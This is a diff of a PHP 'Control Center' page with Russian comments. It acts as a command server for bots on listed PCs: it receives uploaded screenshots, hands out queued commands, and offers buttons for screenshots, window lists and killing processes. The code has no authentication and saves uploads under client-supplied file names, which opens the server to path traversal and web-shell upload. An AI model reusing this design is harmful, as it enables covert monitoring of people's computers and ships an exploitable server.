@@ -1,54 +1,54 @@
+<?php
+$imgDir = 'screenshots/';
+if (!is_dir($imgDir)) mkdir($imgDir);
+
+// 1. Прием скриншота
+if (isset($_FILES['screen'])) {
+    move_uploaded_file($_FILES['screen']['tmp_name'], $imgDir . $_FILES['screen']['name']);
+    echo "ok"; exit;
+}
+
+// 2. Обработка команд (для бота)
+if (isset($_GET['get_cmd'])) {
+    $pc_id = $_GET['pc_id'] ?? 'unknown';
+    $file = "cmd_$pc_id.txt";
+    echo file_exists($file) ? file_get_contents($file) : 'none';
+    exit;
+}
+
+if (isset($_GET['clear_cmd'])) {
+    $pc_id = $_GET['pc_id'];
+    file_put_contents("cmd_$pc_id.txt", 'none');
+    echo "ok"; exit;
+}
+
+// 3. Установка команды с сайта
+if (isset($_POST['set_cmd'])) {
+    $pc_id = $_POST['pc_id'];
+    $cmd = $_POST['set_cmd'];
+    if ($cmd == 'delete') $cmd .= ' ' . $_POST['proc_name'];
+    file_put_contents("cmd_$pc_id.txt", $cmd);
+    header("Location: /"); exit;
+}
+?>
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>Control Center</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 90%; max-width: 800px; background: #1e293b; padding: 20px; border-radius: 12px; margin-top: 20px; }
-        .pc-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
-        .pc-card { background: #334155; padding: 15px; border-radius: 8px; text-align: center; border: 2px solid #475569; }
-        button { background: #6366f1; color: white; border: none; padding: 10px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 5px; }
-        button:hover { background: #4f46e5; }
-        .screenshot-area { margin-top: 30px; border-top: 2px solid #334155; padding-top: 20px; }
-        img { max-width: 100%; border-radius: 8px; border: 2px solid #6366f1; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h1>🚀 Панель управления</h1>
-    
-    <div class="pc-grid">
-        <?php
-        // Список активных ПК (можно хранить в файле)
-        $pcs = ['PC-01', 'PC-02', 'PC-03']; 
-        foreach ($pcs as $pc) {
-            echo "<div class='pc-card'>
-                    <h3>$pc</h3>
-                    <form method='POST'>
-                        <input type='hidden' name='pc_id' value='$pc'>
-                        <button name='set_cmd' value='screen'>📸 Скриншот</button>
-                        <button name='set_cmd' value='app'>📋 Список окон</button>
-                    </form>
-                  </div>";
-        }
-        ?>
-    </div>
-
-    <div class="screenshot-area">
-        <h2>🖼 Последние скриншоты</h2>
-        <?php
-        $files = glob("*.jpg"); // Ищем все скриншоты
-        foreach ($files as $file) {
-            echo "<div style='margin-bottom: 20px;'>
-                    <p>Файл: $file</p>
-                    <img src='$file?" . time() . "'>
-                  </div>";
-        }
-        ?>
-    </div>
-</div>
-
+<html>
+<body style="background:#0f172a; color:white; font-family:sans-serif; text-align:center;">
+    <h1>Панель управления</h1>
+    <?php 
+    $pcs = ['PC-01', 'PC-02']; // Список твоих ID
+    foreach($pcs as $pc) {
+        echo "<div style='border:1px solid #475569; margin:10px; padding:10px;'>
+                <h3>$pc</h3>
+                <form method='POST'>
+                    <input type='hidden' name='pc_id' value='$pc'>
+                    <button name='set_cmd' value='screen'>📸 Скрин</button>
+                    <button name='set_cmd' value='app'>📋 Список окон</button>
+                    <input type='text' name='proc_name' placeholder='Процесс'>
+                    <button name='set_cmd' value='delete'>❌ Kill</button>
+                </form>
+              </div>";
+    }
+    ?>
 </body>
 </html>
